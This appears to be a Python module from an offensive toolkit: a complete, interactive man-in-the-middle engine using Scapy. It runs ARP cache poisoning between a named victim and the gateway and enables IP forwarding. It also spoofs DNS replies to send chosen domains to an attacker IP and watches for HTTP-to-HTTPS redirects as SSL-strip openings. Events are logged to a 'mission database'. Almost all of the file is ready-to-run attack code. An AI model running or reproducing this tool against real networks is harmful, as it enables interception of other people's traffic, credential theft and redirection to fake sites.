"""
modules/mitm.py — Man-in-the-Middle Engine
ARP cache poisoning, DNS hijacking, and SSL strip capabilities.
Uses Scapy for packet crafting. Requires root/admin privileges.
All captured credentials logged to mission database.
"""

import os
import sys
import time
import threading
import socket
import subprocess
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from core.ui import draw_header, Q_STYLE
from core.database import db

try:
    from scapy.all import (
        ARP, Ether, IP, UDP, DNS, DNSRR, DNSQR, TCP, Raw,
        send, sendp, sniff, conf, get_if_addr, get_if_hwaddr
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

console = Console()


# ─────────────────────────────────────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def _is_root() -> bool:
    if hasattr(os, 'getuid'):
        return os.getuid() == 0
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _enable_ip_forward():
    """Enable IP forwarding so traffic passes through us."""
    try:
        if sys.platform.startswith("linux"):
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                           capture_output=True, check=True)
        elif sys.platform == "darwin":
            subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"],
                           capture_output=True, check=True)
        console.print("[green][+] IP forwarding enabled.[/green]")
    except Exception as e:
        console.print(
            f"[yellow][!] Could not enable IP forwarding: {e}[/yellow]")


def _disable_ip_forward():
    try:
        if sys.platform.startswith("linux"):
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                           capture_output=True)
        elif sys.platform == "darwin":
            subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=0"],
                           capture_output=True)
    except Exception:
        pass


def _resolve_mac(ip: str) -> str | None:
    """Send ARP who-has and get MAC address."""
    try:
        arp_req = ARP(pdst=ip)
        eth = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = eth / arp_req
        from scapy.all import srp
        answered, _ = srp(packet, timeout=3, verbose=False)
        if answered:
            return answered[0][1].hwsrc
    except Exception:
        pass
    return None


# ─────────────────────────────────────────────────────────────────────────────
#  ARP SPOOFING
# ─────────────────────────────────────────────────────────────────────────────

class ARPPoisoner:
    """
    Continuously sends spoofed ARP replies to poison target and gateway caches.
    This places us in the middle of all traffic between target and gateway.
    """

    def __init__(self, target_ip: str, gateway_ip: str, iface: str):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface
        self.target_mac = None
        self.gateway_mac = None
        self.attacker_mac = None
        self.running = False
        self.thread = None
        self.packets_sent = 0

    def setup(self) -> bool:
        console.print(
            f"[*] Resolving MACs for {self.target_ip} and {self.gateway_ip}...")
        self.target_mac = _resolve_mac(self.target_ip)
        self.gateway_mac = _resolve_mac(self.gateway_ip)
        self.attacker_mac = get_if_hwaddr(self.iface)

        if not self.target_mac:
            console.print(
                f"[red][!] Could not resolve MAC for {self.target_ip}[/red]")
            return False
        if not self.gateway_mac:
            console.print(
                f"[red][!] Could not resolve MAC for {self.gateway_ip}[/red]")
            return False

        console.print(f"[green][+] Target MAC : {self.target_mac}[/green]")
        console.print(f"[green][+] Gateway MAC: {self.gateway_mac}[/green]")
        return True

    def _poison_loop(self):
        # Spoofed packet to TARGET: "I am the gateway"
        pkt_target = ARP(op=2, pdst=self.target_ip,  hwdst=self.target_mac,
                         psrc=self.gateway_ip,  hwsrc=self.attacker_mac)
        # Spoofed packet to GATEWAY: "I am the target"
        pkt_gateway = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                          psrc=self.target_ip,   hwsrc=self.attacker_mac)

        while self.running:
            send(pkt_target,  verbose=False, iface=self.iface)
            send(pkt_gateway, verbose=False, iface=self.iface)
            self.packets_sent += 2
            time.sleep(2)

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._poison_loop, daemon=True)
        self.thread.start()
        console.print(
            f"[bold green][+] ARP poisoning active — {self.target_ip} ↔ {self.gateway_ip}[/bold green]")

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=3)
        self._restore()

    def _restore(self):
        """Send correct ARP replies to restore target and gateway caches."""
        console.print("[*] Restoring ARP tables...")
        try:
            restore_target = ARP(op=2, pdst=self.target_ip,  hwdst=self.target_mac,
                                 psrc=self.gateway_ip,  hwsrc=self.gateway_mac)
            restore_gateway = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                                  psrc=self.target_ip,   hwsrc=self.target_mac)
            for _ in range(5):
                send(restore_target,  verbose=False, iface=self.iface)
                send(restore_gateway, verbose=False, iface=self.iface)
                time.sleep(0.2)
            console.print("[green][+] ARP tables restored.[/green]")
        except Exception as e:
            console.print(f"[yellow][!] Restore failed: {e}[/yellow]")


# ─────────────────────────────────────────────────────────────────────────────
#  DNS SPOOFER
# ─────────────────────────────────────────────────────────────────────────────

class DNSSpoofer:
    """
    Intercepts DNS queries and responds with a spoofed IP for configured domains.
    Works best in combination with ARP poisoning (to see the traffic).
    """

    def __init__(self, spoof_map: dict, iface: str, attacker_ip: str):
        self.spoof_map = {k.lower(): v for k, v in spoof_map.items()}
        self.iface = iface
        self.attacker_ip = attacker_ip
        self.running = False
        self.thread = None
        self.spoofed = 0

    def _process_packet(self, pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(DNSQR)):
            return
        try:
            qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
            matched_ip = None
            for domain, redirect_ip in self.spoof_map.items():
                if qname.lower().endswith(domain):
                    matched_ip = redirect_ip
                    break

            if matched_ip:
                spoofed = (
                    IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                    UDP(dport=pkt[UDP].sport, sport=53) /
                    DNS(
                        id=pkt[DNS].id,
                        qr=1, aa=1, rd=pkt[DNS].rd,
                        qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNSQR].qname,
                                 ttl=10, rdata=matched_ip)
                    )
                )
                send(spoofed, verbose=False, iface=self.iface)
                self.spoofed += 1
                console.print(
                    f"[bold red][+] DNS Spoofed: {qname} → {matched_ip}[/bold red]")
                db.log("MITM-DNS", pkt[IP].src,
                       f"DNS spoofed: {qname} → {matched_ip}", "CRITICAL")
        except Exception:
            pass

    def _sniff_loop(self):
        sniff(filter="udp port 53", prn=self._process_packet,
              store=0, iface=self.iface,
              stop_filter=lambda _: not self.running)

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self.thread.start()
        console.print(
            f"[bold green][+] DNS Spoofer active on {self.iface}[/bold green]")

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=3)


# ─────────────────────────────────────────────────────────────────────────────
#  SSL STRIP NOTIFIER
# ─────────────────────────────────────────────────────────────────────────────
# Note: Full SSL strip requires an HTTP proxy (mitmproxy/sslstrip).
# This module detects HTTPS downgrade opportunities and logs them.

class SSLStripMonitor:
    """
    Monitors HTTP traffic for 301/302 redirects from HTTP→HTTPS
    and flags them as SSL strip opportunities.
    """

    def __init__(self, iface: str):
        self.iface = iface
        self.running = False
        self.thread = None
        self.found = 0

    def _process_packet(self, pkt):
        if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
            return
        try:
            load = pkt[Raw].load.decode(errors="ignore")
            if "HTTP/1" in load and ("301 " in load or "302 " in load):
                if "Location: https://" in load:
                    lines = load.split("\r\n")
                    location = next(
                        (l for l in lines if l.startswith("Location:")), "")
                    console.print(
                        f"[yellow][!] SSL Strip opportunity: {pkt[IP].src} → {location}[/yellow]")
                    db.log("MITM-SSLStrip", pkt[IP].src,
                           f"HTTPS redirect detected: {location}", "HIGH")
                    self.found += 1
        except Exception:
            pass

    def _sniff_loop(self):
        sniff(filter="tcp port 80", prn=self._process_packet,
              store=0, iface=self.iface,
              stop_filter=lambda _: not self.running)

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=3)


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN MITM MENU
# ─────────────────────────────────────────────────────────────────────────────

def run_arp_poisoning():
    """Interactive ARP poisoning session."""
    if not _is_root():
        console.print(
            "[bold red][!] ARP poisoning requires root/sudo.[/bold red]")
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        return

    target_ip = questionary.text("Target IP (victim):", style=Q_STYLE).ask()
    if not target_ip:
        return

    gateway_ip = questionary.text(
        "Gateway IP (router):",
        default=conf.route.route("0.0.0.0")[2] if hasattr(
            conf, 'route') else "",
        style=Q_STYLE
    ).ask()
    if not gateway_ip:
        return

    iface_list = [i.name for i in conf.ifaces.data.values()]
    iface = questionary.select(
        "Network Interface:", choices=iface_list, style=Q_STYLE).ask()
    if not iface:
        return

    poisoner = ARPPoisoner(target_ip, gateway_ip, iface)
    if not poisoner.setup():
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        return

    _enable_ip_forward()
    poisoner.start()

    db.log("MITM-ARP", target_ip,
           f"ARP poisoning started. Gateway: {gateway_ip}", "CRITICAL")

    console.print(Panel(
        "[bold white]ARP Poisoning Active[/bold white]\n\n"
        f"[white]Target :[/white] {target_ip}  ({poisoner.target_mac})\n"
        f"[white]Gateway:[/white] {gateway_ip} ({poisoner.gateway_mac})\n\n"
        "[dim]All traffic from target is now routed through you.\n"
        "Press [bold]Ctrl+C[/bold] to stop and restore ARP tables.[/dim]",
        border_style="red", title="MITM ACTIVE"
    ))

    try:
        while True:
            time.sleep(5)
            console.print(
                f"[dim][*] ARP packets sent: {poisoner.packets_sent}[/dim]",
                end="\r"
            )
    except KeyboardInterrupt:
        pass
    finally:
        poisoner.stop()
        _disable_ip_forward()
        console.print(
            "\n[green][+] MITM session terminated. ARP restored.[/green]")

    questionary.press_any_key_to_continue(style=Q_STYLE).ask()


def run_dns_hijack():
    """Interactive DNS hijacking session."""
    if not _is_root():
        console.print(
            "[bold red][!] DNS hijacking requires root/sudo.[/bold red]")
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        return

    console.print("[dim]DNS hijacking intercepts DNS queries and returns a fake IP.\n"
                  "Best used in combination with ARP poisoning.[/dim]\n")

    attacker_ip = questionary.text(
        "Your IP (redirect target to):",
        default=get_if_addr(str(conf.iface)),
        style=Q_STYLE
    ).ask()
    if not attacker_ip:
        return

    # Collect domains to spoof
    spoof_map = {}
    console.print("[dim]Enter domains to hijack. Leave blank when done.[/dim]")
    while True:
        domain = questionary.text(
            f"Domain #{len(spoof_map)+1} (e.g., example.com — blank = done):",
            style=Q_STYLE
        ).ask()
        if not domain or not domain.strip():
            break

        redirect_ip = questionary.text(
            f"Redirect {domain.strip()} to IP:",
            default=attacker_ip,
            style=Q_STYLE
        ).ask() or attacker_ip
        spoof_map[domain.strip()] = redirect_ip.strip()

    if not spoof_map:
        return

    iface_list = [i.name for i in conf.ifaces.data.values()]
    iface = questionary.select(
        "Network Interface:", choices=iface_list, style=Q_STYLE).ask()
    if not iface:
        return

    spoofer = DNSSpoofer(spoof_map, iface, attacker_ip)
    spoofer.start()

    console.print(Panel(
        "[bold white]DNS Hijacker Active[/bold white]\n\n" +
        "\n".join(f"  [cyan]{d}[/cyan] → [red]{ip}[/red]" for d, ip in spoof_map.items()) +
        "\n\n[dim]Press Ctrl+C to stop.[/dim]",
        border_style="red", title="DNS HIJACK ACTIVE"
    ))

    try:
        while True:
            time.sleep(3)
            console.print(
                f"[dim][*] DNS responses spoofed: {spoofer.spoofed}[/dim]", end="\r")
    except KeyboardInterrupt:
        pass
    finally:
        spoofer.stop()
        console.print("\n[green][+] DNS hijacker stopped.[/green]")

    questionary.press_any_key_to_continue(style=Q_STYLE).ask()


def run_ssl_monitor():
    """Monitor for SSL strip opportunities."""
    if not _is_root():
        console.print(
            "[bold red][!] SSL monitoring requires root/sudo.[/bold red]")
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        return

    iface_list = [i.name for i in conf.ifaces.data.values()]
    iface = questionary.select(
        "Network Interface:", choices=iface_list, style=Q_STYLE).ask()
    if not iface:
        return

    monitor = SSLStripMonitor(iface)
    monitor.start()

    console.print(Panel(
        "[bold white]SSL Strip Monitor Active[/bold white]\n\n"
        "[dim]Watching for HTTP→HTTPS redirects on the wire.\n"
        "Use with ARP poisoning for full effect.\n"
        "Press Ctrl+C to stop.[/dim]",
        border_style="yellow", title="SSL MONITOR"
    ))

    try:
        while True:
            time.sleep(5)
            console.print(
                f"[dim][*] Opportunities found: {monitor.found}[/dim]", end="\r")
    except KeyboardInterrupt:
        pass
    finally:
        monitor.stop()
        console.print(
            f"\n[green][+] Monitor stopped. {monitor.found} opportunities logged.[/green]")

    questionary.press_any_key_to_continue(style=Q_STYLE).ask()


def run_mitm():
    if not SCAPY_OK:
        console.print(
            "[bold red][!] Scapy not installed. Run: pip install scapy[/bold red]")
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        return

    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        draw_header("MITM Engine — Man in the Middle")

        choice = questionary.select(
            "Select MITM Attack:",
            choices=[
                questionary.Choice(
                    "ARP Cache Poisoning  (intercept all traffic)", value="arp"),
                questionary.Choice(
                    "DNS Hijacking  (redirect domain lookups)",     value="dns"),
                questionary.Choice(
                    "SSL Strip Monitor  (detect HTTPS downgrades)", value="ssl"),
                questionary.Separator(
                    "─────────────────────────────────────────────"),
                questionary.Choice("Return to Main Menu",
                                   value="back"),
            ],
            style=Q_STYLE
        ).ask()

        if not choice or choice == "back":
            break

        actions = {
            "arp": run_arp_poisoning,
            "dns": run_dns_hijack,
            "ssl": run_ssl_monitor,
        }
        if choice in actions:
            try:
                actions[choice]()
            except KeyboardInterrupt:
                console.print("\n[yellow][*] Interrupted.[/yellow]")
            except Exception as e:
                console.print(f"[red][!] Error: {e}[/red]")
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()


if __name__ == "__main__":
    run_mitm()
